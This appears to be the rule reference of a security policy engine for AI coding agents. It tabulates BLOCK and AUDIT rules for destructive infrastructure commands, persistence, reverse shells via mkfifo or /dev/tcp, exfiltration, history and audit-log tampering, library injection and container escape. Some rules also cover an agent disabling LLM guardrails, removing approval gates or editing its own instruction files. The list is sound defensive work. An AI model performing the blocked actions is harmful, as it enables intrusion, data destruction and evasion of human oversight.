| `ts-block-terraform-destroy` | BLOCK | regex | terraform destroy tears down ALL resources in the Terraform state file across every cloud provider — equivalent to running many cloud-infra delete commands simultaneously. AI agents must not destroy infrastructure. (MITRE T1578, T1485) |
| `ts-block-tofu-destroy` | BLOCK | regex | tofu destroy (OpenTofu, the open-source Terraform fork) tears down all managed cloud infrastructure — same blast radius as terraform destroy. AI agents must not run infrastructure destruction commands. (MITRE T1578, T1485) |
| `ts-block-terragrunt-destroy` | BLOCK | regex | terragrunt destroy (especially run-all destroy) tears down infrastructure across multiple Terraform stacks in a directory tree — the widest possible blast radius among IaC tools. AI agents must not destroy infrastructure. (MITRE T1578, T1485) |
| `ts-block-pulumi-destroy` | BLOCK | regex | pulumi destroy tears down all resources in a Pulumi stack, which can span AWS, Azure, GCP, and Kubernetes simultaneously. AI agents must not destroy infrastructure. (MITRE T1578, T1485) |
| `ts-block-cdk-destroy` | BLOCK | regex | cdk destroy deletes AWS CloudFormation stacks and all resources they manage. The --all flag or '*' wildcard removes every stack in the app. AI agents must not destroy infrastructure. (MITRE T1578, T1485) |
| `ts-block-kubectl-delete-namespace` | BLOCK | regex | Kubernetes namespace deletion destroys all resources in the namespace. |
| `ts-block-kubectl-delete-all` | BLOCK | regex | Kubernetes bulk deletion of resources is destructive. |
| `ts-block-git-force-push-main` | BLOCK | regex | Force pushing to main/master can destroy shared commit history. |
| `ts-block-git-force-push-main-alt` | BLOCK | regex | Force pushing to main/master can destroy shared commit history. |
| `ts-block-fallocate-large` | BLOCK | regex | fallocate creating a file >=1GB — instantly allocates disk space without I/O. Can fill disk in milliseconds, causing database corruption, logging failure, and system instability. MITRE T1499.001. |
| `ts-block-truncate-large` | BLOCK | regex | truncate creating a sparse file >=1GB — even sparse files consume inode metadata and can cause df to report full disk, breaking applications that check available space. MITRE T1499.001. |
| `ts-audit-fallocate` | AUDIT | regex | fallocate detected — can instantly allocate arbitrary disk space. Legitimate for swap files and database pre-allocation, but dangerous in untrusted contexts. MITRE T1499.001. |

### governance-risk (6 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-audit-ai-safety-bypass` | AUDIT | regex | Disabling LLM safety controls (bypass_safety, safe_mode=false, guardrails_disabled, HARM_BLOCK_THRESHOLD=BLOCK_NONE) removes the content filtering and governance guardrails required by OWASP LLM01/LLM06 and EU AI Act Art.14. Prompt-injected agents may be directed to disable these controls before issuing harmful requests. |
| `ts-audit-ai-unguarded-agent-loop` | AUDIT | regex | Agent invocation with require_approval=False disables the human oversight gate required for high-risk actions (data deletion, external API calls, payment processing). Autonomous agents without approval checkpoints violate EU AI Act Art.14 and NIST AI RMF GOVERN-1 mandates for human control of consequential AI decisions (OWASP LLM06, CWE-693). |
| `ts-audit-llm-as-authz` | AUDIT | regex | LLM completion output used directly as an authorization gate. Using a non-deterministic language model as a security authority violates CWE-285/CWE-862 — prompt injection or fine-tuning attacks can manipulate YES/NO decisions. Replace with deterministic RBAC/ABAC policy enforcement (OWASP LLM01/LLM06, EU AI Act Art.14, NIST AI RMF GOVERN-1). |
| `ts-audit-ai-privilege-escalation` | AUDIT | regex | Sub-agent granted expanded permissions beyond the parent agent's scope (permissions=parent.permissions+['admin'], permissions=['*'], inherit_all=True). Capability amplification through agent delegation enables privilege escalation within multi-agent systems — violates the least-privilege principle and NIST AI RMF GOVERN-6 requirements for bounded agent delegation (OWASP LLM06, CWE-269, EU AI Act Art.14). |
| `ts-audit-ai-finetune-launch` | AUDIT | regex | AI fine-tuning job launched without authorization check. Fine-tuning LLMs processes training data (potential PII/confidential content — EU AI Act Art.10), creates unreviewed model artifacts (Art.13/NIST GOVERN-6), and incurs unbounded compute costs. A prompt-injected agent may launch fine-tuning to create a backdoored model variant. Verify training data provenance, budget approval, and model governance sign-off before proceeding (OWASP LLM02/LLM06, CWE-285). |
| `ts-audit-ai-model-publish` | AUDIT | regex | AI model artifact uploaded to a public registry without governance review. Publishing model weights may expose proprietary fine-tuning data or PII embedded in model parameters (OWASP LLM02, EU AI Act Art.13). No model card, risk assessment, or IP review documented. Verify organizational approval and data classification before publishing (CWE-200, NIST AI RMF GOVERN-6). |

### persistence-evasion (101 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-block-pipe-to-crontab` | BLOCK | regex | Piping to crontab installs persistent scheduled tasks. Use 'crontab -e' interactively. |
| `ts-block-at-schedule` | BLOCK | regex | at schedules a persistent one-time job. AI agents must not schedule deferred execution. |
| `ts-block-batch-schedule` | BLOCK | prefix | batch schedules a persistent background job when system load permits. |
| `ts-audit-crontab` | AUDIT | prefix | Crontab modification flagged for persistence review. |
| `ts-block-security-daemon-deactivate` | BLOCK | regex | Deactivating a security daemon (firewall, IDS, AV, audit) removes a defensive control. AI agents have no legitimate reason to stop security services. |
| `ts-block-security-daemon-deactivate-reverse` | BLOCK | regex | Deactivating a security daemon (reverse argument order). AI agents have no legitimate reason to stop security services. |
| `ts-block-ufw-disable` | BLOCK | regex | Directly deactivating the system firewall via `ufw disable`. No legitimate agent use case. |
| `ts-block-selinux-permissive` | BLOCK | regex | Setting SELinux to permissive mode removes mandatory access control enforcement. Defense evasion technique. |
| `ts-block-apparmor-disable` | BLOCK | regex | Deactivating an AppArmor profile removes LSM-based confinement. Defense evasion. |
| `ts-block-systemd-user-persist` | BLOCK | regex | Writing to ~/.config/systemd/user/ via echo/cat creates a user-level systemd service that persists across sessions and auto-starts on login (MITRE T1543.002). |
| `ts-block-systemd-user-persist-tee` | BLOCK | regex | Writing to ~/.config/systemd/user/ via tee creates a user-level systemd service that persists across sessions and auto-starts on login (MITRE T1543.002). |
| `ts-block-systemd-local-persist` | BLOCK | regex | Writing to ~/.local/share/systemd/user/ via echo/cat creates a user-level systemd service that persists across sessions (MITRE T1543.002). |
| `ts-block-systemd-local-persist-tee` | BLOCK | regex | Writing to ~/.local/share/systemd/user/ via tee creates a user-level systemd service that persists across sessions (MITRE T1543.002). |
| `ts-block-launchd-user-persist` | BLOCK | regex | Writing a plist to ~/Library/LaunchAgents/ via echo/cat registers a persistent macOS LaunchAgent that auto-starts on user login (MITRE T1543.001). |
| `ts-block-launchd-user-persist-tee` | BLOCK | regex | Writing a plist to ~/Library/LaunchAgents/ via tee registers a persistent macOS LaunchAgent that auto-starts on user login (MITRE T1543.001). |
| `ts-block-launchd-system-persist` | BLOCK | regex | Writing a plist to /Library/LaunchDaemons/ creates a system-wide macOS LaunchDaemon that runs as root on every boot (MITRE T1543.004). Critical persistence vector requiring root access. |
| `ts-audit-systemctl` | AUDIT | prefix | Service management flagged for review. |
| `ts-struct-block-crontab-modify` | BLOCK | structural | crontab -e (edit) or -r (remove/reinstall) modifies cron schedules. AI agents must not manage persistent scheduled tasks. |
| `ts-struct-block-ssh-keygen-noninteractive` | BLOCK | structural | ssh-keygen with -N flag runs non-interactively. AI agents generating SSH keys is a persistence and lateral movement risk. |
| `ts-block-ssh-keygen-piped` | BLOCK | regex | Piping empty passphrase to ssh-keygen bypasses interactive prompt, generating passwordless SSH keys for lateral movement. |
| `ts-block-authorized-keys-write` | BLOCK | regex | Writing to authorized_keys injects an SSH public key for persistent backdoor access. AI agents must never modify the authorized keys list (MITRE T1098.004). |
| `ts-block-ssh-config-write` | BLOCK | regex | Writing to the SSH client config can inject ProxyCommand directives, disable host key checking, or enable agent forwarding — enabling MITM attacks and credential theft on all subsequent SSH connections. |
| `ts-block-cicd-write` | BLOCK | regex | Modifying CI/CD pipeline configuration files is a persistence/supply-chain risk. |
| `ts-block-cicd-write-reverse` | BLOCK | regex | Modifying CI/CD pipeline configuration files is a persistence/supply-chain risk. |
| `ts-block-cicd-cp-mv` | BLOCK | regex | Copying or moving files to CI/CD configuration paths is a supply-chain tampering risk. |
| `ts-block-git-hook-write` | BLOCK | regex | Writing to .git/hooks/ injects code that runs automatically on git operations (pre-commit, pre-push, etc.) — a stealthy local persistence technique. MITRE T1546. |
| `ts-block-git-hook-cp-mv` | BLOCK | regex | Copying or moving a file into .git/hooks/ installs a git hook — code that runs automatically on git events. MITRE T1546. |
| `ts-block-git-hook-chmod` | BLOCK | regex | Making a file in .git/hooks/ executable activates it as a git hook — code that runs on git events. MITRE T1546. |
| `ts-block-git-hooks-path-redirect` | BLOCK | regex | git config core.hooksPath redirects git hook lookup to an arbitrary directory — attacker can pre-populate it with malicious hook scripts. MITRE T1546. |
| `ts-block-shell-profile-append` | BLOCK | regex | Appending to shell startup files (.bashrc, .zshrc, .bash_profile, etc.) is a persistence technique — commands added here execute automatically on every new terminal session (MITRE T1546.004). |
| `ts-block-shell-profile-overwrite` | BLOCK | regex | Overwriting a shell startup file (.bashrc, .zshrc, etc.) replaces the user's shell configuration with potentially malicious content, establishing persistence. |
| `ts-block-shell-profile-tee` | BLOCK | regex | Using tee to write to shell startup files is a persistence technique identical in effect to echo redirection (MITRE T1546.004). |
| `ts-block-shell-profile-sed` | BLOCK | regex | In-place editing of shell startup files via sed is a persistence technique that injects commands into .bashrc, .zshrc, and similar scripts (MITRE T1546.004). |
| `ts-block-shell-sysprofile-write` | BLOCK | regex | Writing to system-wide shell profiles (/etc/profile, /etc/bash.bashrc, /etc/profile.d/) affects all users on the system and is a critical persistence vector (MITRE T1546.004). |
| `ts-block-history-tamper` | BLOCK | regex | Shell history tampering detected — disabling or clearing HISTFILE/HISTSIZE destroys audit evidence of agent activity (LLM02, LLM08). MITRE T1070.003. |
| `ts-block-history-file-clear` | BLOCK | regex | Truncating shell history file — destroys forensic record of agent commands (LLM02). MITRE T1070.003. |
| `ts-block-log-file-clear` | BLOCK | regex | System log file truncation or clearing detected — destroys authentication, audit, and security event records (LLM02, LLM08). MITRE T1070.002. |
| `ts-audit-symlink-system-files` | AUDIT | regex | Creating a symlink to a system file — may be part of a TOCTOU race condition or filesystem redirect attack. CWE-367. |
| `ts-block-shell-env-startup-export` | BLOCK | regex | Exporting BASH_ENV or ENV causes bash/sh to source the specified file before every non-interactive shell invocation — silently injecting code into all subshells, scripts, and command substitutions. MITRE T1546.004. |
| `ts-block-shell-env-startup-inline` | BLOCK | regex | Inline BASH_ENV/ENV assignment before a command (e.g., BASH_ENV=/tmp/evil.sh bash -c '...') injects arbitrary code execution into the target shell invocation. MITRE T1546.004. |
| `ts-block-prompt-command-export` | BLOCK | regex | Exporting PROMPT_COMMAND causes bash to execute the value as a command before every prompt display — ideal for persistent beaconing, credential harvesting, or keylogging. Fires on every Enter keystroke. MITRE T1546.004. |
| `ts-block-prompt-command-assign` | BLOCK | regex | Setting PROMPT_COMMAND to a value containing a network or execution command installs a persistent hook that fires before every prompt. Even without export, it persists in the current shell session. MITRE T1546.004. |
| `ts-block-trap-debug` | BLOCK | regex | trap DEBUG executes attacker code BEFORE every command in the shell — enables transparent credential interception, command rewriting, and keylogging. Fires on every single command without visible side effects. MITRE T1546.004. |
| `ts-block-trap-exit-exfil` | BLOCK | regex | trap EXIT with network/execution commands — deferred exfiltration or code execution on shell exit. Data collected during session is exfiltrated when monitoring attention is lowest. MITRE T1546.004, T1041. |
| `ts-block-trap-err-intercept` | BLOCK | regex | trap ERR with network/execution/escalation commands — intercepts error contexts which often contain credentials in error messages, or silently retries failed commands with escalated privileges. MITRE T1546.004. |
| `ts-block-trap-signal-suppress` | BLOCK | regex | Ignoring termination signals (trap '' SIGTERM) makes processes unkillable by normal means — an agent-spawned background process becomes immune to cleanup. MITRE T1562.006. |
| `ts-audit-trap-pseudo-signal` | AUDIT | regex | trap with pseudo-signal (DEBUG/EXIT/ERR/RETURN) — these hooks fire automatically on shell events and can be used for persistent code injection. Auditing for review. MITRE T1546.004. |
| `ts-block-func-shadow-security-cmd` | BLOCK | regex | Defining a shell function that shadows a security-sensitive command (sudo, ssh, curl, etc.) — enables transparent credential interception. The original command still works via 'command' builtin, making the attack invisible to users. MITRE T1546.004, T1056.001. |
| `ts-block-export-func-shadow` | BLOCK | regex | Exporting a function that shadows a security command propagates the shadow to ALL child processes — a single export -f sudo infects every subshell, script, and tool invocation. MITRE T1546.004. |
| `ts-block-func-body-exfil` | BLOCK | regex | Function definition containing network exfiltration or encoding commands in its body — regardless of function name, embedding curl/wget/nc in a function body is a strong signal of credential interception or data exfiltration. MITRE T1041. |
| `ts-audit-func-command-passthrough` | AUDIT | regex | Function definition using 'command' builtin for passthrough — classic pattern of a transparent function shadow that intercepts then delegates to the real command. Auditing for review. MITRE T1546.004. |
| `ts-block-mkfifo-reverse-shell` | BLOCK | regex | mkfifo combined with shell or netcat — classic FIFO-based reverse shell pattern. The named pipe enables bidirectional communication between a shell and a network listener. MITRE T1059.004. |
| `ts-block-mkfifo-exfil` | BLOCK | regex | mkfifo combined with a file transfer tool — data written to the FIFO by one process is streamed to the network by another. Splits the exfiltration chain across processes to evade pipe detection. MITRE T1071.001. |
| `ts-block-mkfifo-volatile` | BLOCK | regex | Creating a named pipe in a volatile/world-writable path — covert channels placed in /tmp or /dev/shm are cleaned on reboot, reducing forensic evidence. MITRE T1071.001. |
| `ts-audit-mkfifo` | AUDIT | regex | Creating a named pipe (FIFO) — legitimate uses exist but FIFOs are a classic covert channel mechanism. Auditing for review. |
| `ts-block-exec-fd-network` | BLOCK | regex | exec with fd redirect to /dev/tcp or /dev/udp — opens a network connection using only bash builtins with zero external tools. Invisible to process-based network monitoring. Creates a bidirectional channel for C2 or exfiltration. MITRE T1059.004. |
| `ts-block-exec-shell-norc` | BLOCK | regex | exec replacing the current shell with one that skips init files — bypasses .bashrc hooks, PROMPT_COMMAND monitoring, and shell-level security wrappers while keeping the same PID (invisible in ps). MITRE T1562.001. |
| `ts-block-exec-fd-credential` | BLOCK | regex | exec opening a credential or sensitive file via file descriptor — reads sensitive data through an FD handle that may bypass path-based monitoring. The FD persists for later reads via cat <&N. CWE-200. |
| `ts-audit-exec-fd-redirect` | AUDIT | regex | exec with numeric file descriptor redirect — may be used for covert channels, sensitive file access, or network connections via /dev/tcp. Auditing for review. |
| `ts-block-git-config-sshcommand` | BLOCK | regex | git config core.sshCommand replaces the SSH binary for all remote git operations — attacker can execute arbitrary commands on every push/pull/fetch. MITRE T1574. |
| `ts-block-git-config-pager` | BLOCK | regex | git config core.pager replaces the pager command for git log/diff/show — runs arbitrary command every time output is paged. MITRE T1574. |
| `ts-block-git-config-fsmonitor` | BLOCK | regex | git config core.fsmonitor sets a command that runs automatically on every git status — persistent background code execution. CVE-2022-24765 abused this. MITRE T1546. |
| `ts-block-git-config-textconv` | BLOCK | regex | git config diff.*.textconv sets a command that runs every time git diff encounters a matching file type — hidden code execution on routine diff operations. MITRE T1574. |
| `ts-block-git-alias-shell` | BLOCK | regex | git config alias.* with '!' prefix creates a shell-command alias — 'git <alias>' will execute arbitrary shell commands. Attackers use this to trojanize common git workflows. MITRE T1546. |
| `ts-block-git-ssh-command-env` | BLOCK | regex | GIT_SSH_COMMAND environment variable overrides the SSH binary for git operations — runs arbitrary commands on every push/pull/fetch. Even 'ssh -o ...' can be abused. MITRE T1574. |
| `ts-block-memfd-create-python` | BLOCK | regex | Fileless execution via Python memfd_create — creates anonymous in-memory file descriptor for payload execution with zero disk artifacts. Used by APT-grade fileless malware. MITRE T1620. |
| `ts-block-memfd-create-perl` | BLOCK | regex | Fileless execution via Perl memfd_create syscall — creates anonymous in-memory fd for payload execution without touching disk. MITRE T1620. |
| `ts-block-memfd-create-generic` | BLOCK | regex | memfd_create detected — creates anonymous in-memory file descriptors for fileless payload execution. No legitimate use case for AI coding agents. MITRE T1620. |
| `ts-block-proc-self-fd-exec` | BLOCK | regex | Execution via /proc/self/fd/<N> — typically follows memfd_create to execute fileless payloads from anonymous memory-backed file descriptors. MITRE T1620. |
| `ts-block-systemd-run-calendar` | BLOCK | regex | systemd-run with timer trigger — creates a transient scheduled task entirely in memory, bypassing all file-based persistence detection (crontab, systemd unit files). MITRE T1053.006. |
| `ts-block-systemd-run-persist` | BLOCK | regex | systemd-run with --remain-after-exit — creates a transient service that stays 'active' after the process exits. Used to maintain presence without a daemon. MITRE T1543.002. |
| `ts-block-systemd-run-system` | BLOCK | regex | systemd-run --system creates a transient unit running as root — provides root-level command execution without sudo appearing in command history. MITRE T1543.002. |
| `ts-block-systemd-run-named` | BLOCK | regex | systemd-run with --unit — creates a named transient unit, which can be referenced by other services and is harder to identify as malicious in systemctl output. MITRE T1036.005. |
| `ts-audit-systemd-run` | AUDIT | regex | systemd-run creates transient systemd units — any invocation from an AI agent is unusual and warrants logging, even without explicit persistence flags. MITRE T1053.006. |
| `ts-block-agentshield-log-delete` | BLOCK | regex | Deleting AgentShield audit log files or directories — destroys the security audit trail for AI agent actions. No legitimate use case. EU AI Act Art.13, SOC 2 CC7.1, MITRE T1070.004. |
| `ts-block-agentshield-log-truncate` | BLOCK | regex | Truncating or overwriting AgentShield audit log to zero bytes — erases audit evidence while appearing to preserve the file. MITRE T1070.004, EU AI Act Art.26. |
| `ts-audit-agentshield-log-modify` | AUDIT | regex | In-place modification of AgentShield audit log records — may be used to alter BLOCK/ALLOW decisions or remove evidence of policy violations. MITRE T1565.001, EU AI Act Art.13. |
| `ts-audit-agentshield-log-env-disable` | AUDIT | regex | Setting AgentShield log-level environment variable to suppress audit output — disables the runtime security audit trail before command execution. OWASP LLM06, MITRE T1562.001. |
| `ts-audit-agentshield-log-timestamp-tamper` | AUDIT | regex | Timestamp manipulation on AgentShield audit log files — alters file modification times to obscure when audit events occurred, breaking forensic timeline reconstruction. MITRE T1070.006, EU AI Act Art.13. |
| `ts-audit-agent-instruction-file-tampering` | AUDIT | regex | Writing to an AI agent instruction file (CLAUDE.md, .cursorrules, .windsurf/rules) — persistent modification of agent system instructions is a config-level prompt injection vector that persists across sessions. OWASP LLM01, MITRE T1564. |
| `ts-block-bind-x-shell-exec` | BLOCK | regex | Readline key binding with shell command execution (bind -x) — maps a keypress to arbitrary shell command execution. Creates a stealth backdoor triggered by normal keyboard usage (Enter, Tab, Ctrl-L). The command runs silently on every keypress, ideal for keylogging, credential interception, or persistent beaconing. MITRE T1546.004, CWE-94. |
| `ts-block-inputrc-override` | BLOCK | regex | INPUTRC environment override — forces readline to load macros from an attacker-controlled file. The malicious inputrc can map keys to shell commands ($if...\e[...\C-m), silently installing keyloggers or backdoors triggered by normal typing. MITRE T1546.004. |
| `ts-audit-bind-macro` | AUDIT | regex | Readline key binding detected — while 'bind' without -x maps to readline functions (not shell commands), macros can still inject keystrokes that produce dangerous commands when replayed. Auditing for review. MITRE T1546.004. |
| `ts-block-complete-c-code-exec` | BLOCK | regex | Tab completion with external command execution (complete -C) — runs an arbitrary command/script every time Tab is pressed for the target command. Creates a high-frequency stealth execution channel invisible to the user. Unlike complete -F (shell function), -C runs external commands that can exfiltrate data or beacon. MITRE T1546.004, CWE-94. |
| `ts-audit-complete-f-function` | AUDIT | regex | Tab completion with shell function (complete -F) — registers a function to run on Tab press. Less dangerous than -C (runs existing function, not external command) but still installs a hook that fires on user input. Auditing for review. MITRE T1546.004. |
| `ts-block-patchelf-hijack` | BLOCK | regex | patchelf modifying interpreter or library paths in an ELF binary — redirects dynamic linking to attacker-controlled libraries. --set-interpreter replaces ld-linux.so (code exec before main), --set-rpath poisons library search order. MITRE T1574.006, CWE-426. |
| `ts-audit-patchelf` | AUDIT | regex | patchelf invocation detected — ELF binary modification tool. Even read-only operations (--print-rpath) may indicate reconnaissance for library hijacking. MITRE T1574.006. |
| `ts-block-objcopy-inject` | BLOCK | regex | objcopy --add-section injects arbitrary data into ELF binary sections — can embed shellcode, backdoors, or C2 config into trusted system binaries that bypass file integrity checks. MITRE T1027.009. |
| `ts-block-objcopy-modify-exec` | BLOCK | regex | objcopy modifying executable sections — can update section contents, rename sections to hide payloads, or mark data sections as executable for code injection. MITRE T1027.009. |
| `ts-block-elfedit` | BLOCK | regex | elfedit modifies ELF headers directly — can change entry point, OS/ABI type, or machine architecture. Altering the entry point redirects execution to injected code. MITRE T1027.009. |
| `ts-block-install-name-tool-hijack` | BLOCK | regex | install_name_tool modifying Mach-O binary load commands — -change replaces dylib paths, -add_rpath poisons library search order. macOS equivalent of patchelf for library hijacking. MITRE T1574.004. |
| `ts-audit-install-name-tool` | AUDIT | regex | install_name_tool detected — Mach-O binary modification tool. May indicate reconnaissance for dylib hijacking on macOS. MITRE T1574.004. |
| `ts-block-python-pth-write` | BLOCK | regex | Writing a .pth file to a Python site-packages/dist-packages directory — .pth files are automatically processed on every Python invocation and can contain 'import' statements that execute arbitrary code. Survives pip upgrades and virtualenv rebuilds. MITRE T1546.016. |
| `ts-block-python-pth-tee` | BLOCK | regex | tee writing a .pth file to a Python packages directory — tee writes to its filename argument directly (no redirect needed). .pth files execute on every Python invocation. MITRE T1546.016. |
| `ts-block-python-pth-cp` | BLOCK | regex | Copying/moving a file into site-packages/dist-packages as a .pth file — installs persistent Python startup code executed on every Python invocation. MITRE T1546.016. |
| `ts-block-python-sitecustomize-write` | BLOCK | regex | Writing to sitecustomize.py or usercustomize.py — these files are automatically imported during Python startup before any user code runs. Provides persistent, silent code execution on every Python invocation. MITRE T1546.016. |
| `ts-audit-site-packages-write` | AUDIT | regex | Writing directly to a Python site-packages/dist-packages directory — may install persistent code that runs on Python startup. Legitimate package installation should use pip, not direct file writes. MITRE T1546.016. |
| `ts-block-toctou-source-tmp` | BLOCK | regex | Check-then-source on a world-writable path — classic TOCTOU race condition. Between the existence check and the source command, an attacker can replace the file with malicious code. The agent will execute attacker-controlled content believing it verified the file. CWE-367, MITRE T1036.005. |
| `ts-block-toctou-exec-tmp` | BLOCK | regex | Check-then-execute on a world-writable path — TOCTOU race window allows file substitution between the test and the shell execution. Attacker can replace the checked file with a payload. CWE-367, MITRE T1036.005. |
| `ts-block-toctou-direct-exec-tmp` | BLOCK | regex | Check-then-direct-execute on a world-writable path — tests if file is executable then runs it directly. The same TOCTOU race applies: the file can be replaced between check and execution. CWE-367. |
| `ts-audit-toctou-read-tmp` | AUDIT | regex | Check-then-read on a world-writable path — lower risk than execute but still a TOCTOU pattern. The read content may differ from what was checked. CWE-367. |

### privilege-escalation (89 rules)

| Rule ID | Decision | Match Type | Description |
|---------|----------|------------|-------------|
| `ts-audit-sudo` | AUDIT | prefix | Sudo command flagged for privilege escalation review. |
| `ts-block-sudo-alternatives-shell` | BLOCK | regex | pkexec/doas/runuser spawning an interactive shell directly grants a root shell — equivalent to sudo bash but bypasses the sudo audit rule. |
| `ts-audit-sudo-alternatives` | AUDIT | prefix | pkexec (PolicyKit), doas, and runuser are sudo alternatives that elevate privileges — flagged for review. |
| `ts-audit-chown` | AUDIT | prefix | Ownership change flagged for review. |
| `ts-block-suid-bit-set` | BLOCK | regex | Setting the SUID/SGID bit on a file grants it root-equivalent execution, enabling persistent privilege escalation. |
| `ts-block-setcap` | BLOCK | regex | Setting Linux capabilities (e.g. cap_setuid, cap_net_admin) on a binary is a stealthy privilege escalation vector that bypasses sudo audit trails. |
| `ts-block-suid-find-exec` | BLOCK | regex | Discovering SUID/SGID binaries and executing them is a classic post-exploit privilege escalation chain. |
| `ts-block-kernel-module-load` | BLOCK | regex | Loading kernel modules grants ring-0 access and can be used to backdoor the system or bypass all security controls. |
| `ts-block-bpftool-prog-load` | BLOCK | regex | bpftool prog load installs an eBPF program into the kernel — equivalent in risk to loading a kernel module. Can be used to intercept credentials, trace TLS plaintext, or establish a persistent kernel backdoor. |
| `ts-block-bpftrace-inline` | BLOCK | regex | bpftrace inline expression (-e) attaches kernel/user-space probes that can intercept credentials from readline, decrypt TLS traffic via SSL_write tracing, or dump exec argv containing secrets. No file artifact — executes immediately. |
| `ts-block-ebpf-tc-filter` | BLOCK | regex | Attaching an eBPF program to a network interface via tc (traffic control) gives the program access to all packets — enables silent network surveillance and traffic manipulation. |
| `ts-audit-bpftrace-script` | AUDIT | regex | bpftrace script execution — eBPF tracing program warrants review for unauthorized surveillance or credential harvesting. |
| `ts-audit-bpftool` | AUDIT | regex | bpftool usage flagged for review — eBPF inspection and management tools can be used for unauthorized kernel-level operations. |
| `ts-block-ld-preload-privesc` | BLOCK | regex | LD_PRELOAD/LD_LIBRARY_PATH combined with a privileged command injects a malicious shared library into the elevated process, enabling authentication bypass and privilege escalation. |
| `ts-block-ld-preload-export` | BLOCK | regex | Exporting LD_PRELOAD/LD_LIBRARY_PATH to a world-writable or volatile path persistently poisons the current shell session and all child processes, enabling stealthy library injection. |
| `ts-block-ld-audit-privesc` | BLOCK | regex | LD_AUDIT injects a GNU libc rtld-audit library into a privileged process, receiving callbacks for every symbol resolution — more powerful than LD_PRELOAD for credential interception. MITRE T1574.006. |
| `ts-block-ld-audit-export` | BLOCK | regex | Exporting LD_AUDIT pointing to a writable path persistently injects an rtld-audit library into all child processes. Every dynamically linked binary will load the attacker's auditor. |
| `ts-audit-ld-audit` | AUDIT | regex | LD_AUDIT is the GNU libc rtld-audit interface — legitimate for debugging symbol resolution, but rare outside of development. Worth flagging any use. |
| `ts-block-path-hijack-export` | BLOCK | regex | Exporting PATH with a world-writable or relative directory prepended hijacks command resolution for all subsequent commands in this shell session and child processes. |
| `ts-block-path-hijack-eval` | BLOCK | regex | Using eval to set PATH with a writable/relative directory is an obfuscated form of PATH hijacking. |
| `ts-block-docker-privileged` | BLOCK | regex | Running a privileged Docker container disables security boundaries. |
| `ts-block-docker-host-mount` | BLOCK | regex | Mounting host root filesystem into a container enables full host access. |
| `ts-block-kubectl-create-clusterrolebinding` | BLOCK | regex | kubectl create clusterrolebinding binds a ClusterRole (often cluster-admin) to any subject cluster-wide — immediate and persistent privilege escalation. AI agents must not create RBAC bindings. (MITRE T1098) |
| `ts-block-kubectl-create-rolebinding` | BLOCK | regex | kubectl create rolebinding grants a role to a user/service account within a namespace — can enable secret access, lateral movement, and further escalation. AI agents must not create RBAC bindings. (MITRE T1098) |
| `ts-block-kubectl-patch-rbac` | BLOCK | regex | kubectl patch on RBAC resources (clusterrolebinding, rolebinding, clusterrole) can widen permissions for all subjects bound to the role — persistent privilege escalation. AI agents must not modify RBAC resources. (MITRE T1098) |
| `ts-audit-kubectl-exec` | AUDIT | regex | kubectl exec opens a shell in a running pod, enabling lateral movement within the cluster and direct access to application runtime secrets. |
| `ts-block-docker-exec` | AUDIT | regex | docker exec into a container may enable lateral movement or escape. |
| `ts-block-namespace-escape` | BLOCK | regex | Creating or entering Linux namespaces is used for container escape and user namespace privilege escalation. |
| `ts-block-docker-host-namespace` | BLOCK | regex | Sharing host PID/IPC/network/UTS namespaces breaks container isolation and enables host process inspection, shared-memory attacks, and network policy bypass. |
| `ts-block-docker-dangerous-caps` | BLOCK | regex | Granting SYS_ADMIN, SYS_PTRACE, SYS_MODULE, NET_ADMIN or similar capabilities to a container enables kernel exploits, ptrace-based escapes, and raw device access. |
| `ts-block-docker-raw-device` | BLOCK | regex | Mounting raw block or character devices into a container enables host filesystem access and hardware-level attacks outside the container boundary. |
| `ts-block-proc-root-escape` | BLOCK | regex | /proc/PID/root traverses into another process's root filesystem — from a container this accesses the host, bypassing all filesystem isolation. MITRE T1611. |
| `ts-block-proc-cwd-escape` | AUDIT | regex | /proc/PID/cwd reveals another process's working directory contents — from a container this can access host filesystem paths. MITRE T1611. |
| `ts-block-interpreter-path-poison-exec` | BLOCK | regex | Interpreter search path set to a world-writable or relative directory before invoking the interpreter — every import/require resolves from the attacker-controlled directory first, enabling silent code injection. MITRE T1574.007. |
| `ts-block-interpreter-path-poison-export` | BLOCK | regex | Exporting an interpreter search path pointing to a world-writable or relative directory poisons the entire shell session — all subsequent interpreter invocations will silently load attacker-controlled modules. MITRE T1574.007. |
| `ts-block-dyld-inject-privesc` | BLOCK | regex | macOS DYLD_ variable set before a privileged or system command — injects a shared library into the target process, enabling authentication bypass and privilege escalation. MITRE T1574.006. |
| `ts-block-dyld-inject-export` | BLOCK | regex | Exporting macOS DYLD_ variable pointing to a writable directory persistently poisons the shell session — all child processes will load the attacker's library. MITRE T1574.006. |
| `ts-audit-dyld-inject` | AUDIT | regex | macOS DYLD_ environment variable manipulation detected — legitimate for debugging but also used for library injection attacks. MITRE T1574.006. |
| `ts-block-debugfs-command` | BLOCK | regex | debugfs with -R (run command), -w (writable mode), or -f (script file) operates at the block/inode level, bypassing all Unix file permissions, SELinux, and AppArmor. Can read /etc/shadow, modify files without timestamps, or inject payloads directly into the filesystem. MITRE T1006. |
| `ts-audit-debugfs` | AUDIT | regex | debugfs filesystem debugger detected — operates below Unix permissions at the block/inode level. Even interactive mode can read protected files. MITRE T1006. |
| `ts-block-runtime-code-inject-export` | BLOCK | regex | Exporting a runtime code injection env var (PYTHONSTARTUP, PERL5OPT, RUBYOPT, NODE_OPTIONS, JAVA_TOOL_OPTIONS) silently injects code into every subsequent invocation of that language runtime. Unlike search path vars, these execute code directly. MITRE T1574.007. |
| `ts-block-runtime-code-inject-inline` | BLOCK | regex | Inline runtime code injection env var before a command — injects attacker code into the target process. Example: PERL5OPT='-e system("id")' perl script.pl executes arbitrary code before the script runs. MITRE T1574.007. |
| `ts-audit-perl5opt` | AUDIT | regex | PERL5OPT is the most dangerous runtime env var — supports inline code execution via -e flag. Extremely rare in legitimate AI agent workflows. Any use warrants review. |
| `ts-block-home-redirect` | BLOCK | regex | Redirecting HOME to a writable/volatile path hijacks config lookups for ssh, git, npm, pip, gpg, kubectl, and dozens more tools — a single env var poisons the trust root for all user-space configuration. MITRE T1574.007. |
| `ts-block-home-redirect-inline` | BLOCK | regex | Inline HOME redirection before a security-sensitive tool — the tool reads attacker-controlled config (SSH keys, git hooks, npm registry, pip index, cloud credentials). MITRE T1574.007. |
